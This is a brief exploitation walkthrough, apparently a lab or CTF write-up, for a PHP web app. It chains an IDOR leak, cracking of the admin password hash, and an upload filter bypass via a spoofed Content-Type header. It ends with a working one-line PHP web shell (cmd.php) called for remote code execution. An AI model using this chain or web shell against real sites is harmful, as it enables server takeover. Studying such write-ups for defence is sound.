# IDOR --> Admin account take over --> php file upload --> rce

1)Upon signing up, the web app leaks the API endpoint "/api.php?id=".

2)From these endpoints, we can access other account information (IDOR - Insecure Direct Object Reference).

3)Find the admin's account information and crack the hashed password.

4)Log in to the admin account and use the upload image function to upload a malicious PHP file;- only the admin account has access to upload images. (One can also find the leaked API endpoint from the upload page)

5)The web app only checks the Content-Type of the file and allows uploading.

6)If we change the "Content-Type" header to image/jpg, image/png, or image/jpeg (which can be found after the 'Content-Disposition' header), the web app will allow uploading any file (we will use cmd.php).


------WebKitFormBoundaryTVUL4RcAiWXxDizN


Content-Disposition: form-data; name="fileToUpload"; filename="cmd.php"


Content-Type: image/jpg  <-- change this



7)After successful upload, we can copy the randomly generated file name from the prompt. Try to access that file by visiting http://url/uploads/Random-file.php?cmd=id (RCE)



cmd.php:

<?php system($_GET['cmd']);?>
